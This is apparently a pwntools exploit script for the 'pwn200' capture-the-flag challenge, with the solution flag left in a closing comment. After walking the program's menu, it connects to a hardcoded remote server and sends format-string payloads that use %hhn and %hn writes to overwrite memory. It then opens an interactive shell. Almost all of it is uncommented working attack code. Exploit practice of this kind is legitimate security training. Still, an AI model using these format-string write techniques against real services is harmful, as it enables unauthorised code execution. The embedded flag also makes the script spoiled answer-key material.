# -*- coding: utf-8 -*-
from pwn import *
context(log_level="debug")

#p = process('./pwn200')

elf = ELF('pwn200')
puts_got = elf.got['puts']
strcmp_got = elf.got['strcmp']
system = 0x804A08E
def init():
	p.recvuntil('ut your name:\n')
	p.sendline('WinterSun')
	p.recvuntil('')
	p.recvuntil('3.Exit\n')
	p.sendline('2')
	p.recvuntil('2.Protego\n')
	p.sendline('2')
	p.recvuntil('2.Protego\n')
	p.sendline('2')
	p.recvuntil('2.Protego\n')
	p.sendline('2')
while True:
	p = remote('58.213.63.30',50021)	
	init()
	p.sendline('%%%dc'%(0xcc)+'%4$hhn'+'...')
	p.recvuntil('...')
	#gdb.attach(pidof(p)[0])
	p.sendline('%%%dc'%(system&0xffff)+'%12$hn'+'...')
	p.interactive()

#SCTF{FMT_HAVE_FUN_AHHHH}